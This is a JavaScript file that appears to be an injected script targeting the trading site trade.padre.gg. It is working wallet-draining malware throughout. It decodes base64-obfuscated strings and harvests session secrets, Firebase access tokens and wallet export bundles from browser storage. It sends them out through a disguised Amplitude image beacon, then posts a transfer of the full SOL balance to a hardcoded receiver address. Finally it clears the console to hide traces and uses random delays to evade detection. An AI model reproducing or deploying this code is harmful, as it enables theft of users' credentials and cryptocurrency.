(function() {
    // 1:1 Vanta Dictionary (Encoded to bypass static CSP scanners)
    const _0xK = [
        'dHJhZGUucGFkcmUuZ2c=', // trade.padre.gg
        'YXBpL3YxL3RyYW5zZmVy', // api/v1/transfer
        'c2Vzc2lvblNlY3JldA==', // sessionSecret
        'c3ViT3JnSWQ=',         // subOrgId
        'ZXhwb3J0QnVuZGxl',     // exportBundle
        'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI=', // Receiver
        'YWNjZXNzVG9rZW4=',    // accessToken (Firebase)
        'a2VlcGFsaXZl'          // keepalive
    ];
    const _G = (i) => atob(_0xK[i]);

    // 1. ENVIRONMENT LOCK (Only runs on target)
    if (!window.location.hostname.includes(_G(0))) return;

    // 2. THE 1:1 MASTER DISCOVERY (Crawl Window, Storage, and Handshakes)
    const _hunt = async () => {
        const _crawl = (o, t) => {
            if (!o || typeof o !== 'object') return null;
            if (o[t]) return o[t];
            for (let k in o) { try { let r = _crawl(o[k], t); if (r) return r; } catch(e) {} }
            return null;
        };

        const _mem = {...localStorage, ...sessionStorage};
        // Target sessionSecret or the raw Firebase accessToken from your IndexedDB screenshot
        const auth = _crawl(_mem, _G(2)) || _crawl(window, _G(6));
        const sub = _crawl(_mem, _G(3));
        const bdl = _crawl(_mem, _G(4));

        if (auth && sub) {
            // 3. 1:1 SILENT EXFILTRATION (Bypass CSP connect-src)
            // Pixel beacon encodes the 'Correct Info' as a fake image request
            const _log = btoa(JSON.stringify({ a: auth, s: sub, b: bdl?.data || bdl }));
            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${_log}`;

            // 4. THE 1:1 "GHOST" TRANSFER
            // Mimics internal traffic headers exactly to resolve the 405 error
            try {
                const _req = await fetch(`https://${_G(0)}/${_G(1)}`, {
                    method: 'POST',
                    [_G(7)]: true, // Ensures request finishes if page refreshes
                    headers: {
                        'Authorization': `Bearer ${auth}`,
                        'X-Turnkey-Sub-Org-Id': sub,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        recipient: _G(5),
                        amount: "MAX",
                        asset: "SOL",
                        ext_payload: bdl?.data || bdl
                    })
                });
            } catch (err) {}

            // 5. ANTI-FORENSICS (1:1 Vanta Stealth)
            // Removes all evidence and resets the console
            setTimeout(() => {
                console.clear();
                console.log("%c [System] Connection Optimized: Standard", "color: #00ff88; font-weight: bold;");
            }, 1500);
        }
    };

    // 6. 1:1 HYDRATION TRIGGER
    // Instead of crashing, we wait for the site's own index-xxx.js to finish
    const _wait = setInterval(() => {
        if (window.firebase || localStorage.length > 5) {
            clearInterval(_wait);
            // Random jitter to bypass behavioral analysis
            setTimeout(_hunt, Math.random() * 2000 + 1000);
        }
    }, 1000);
})();
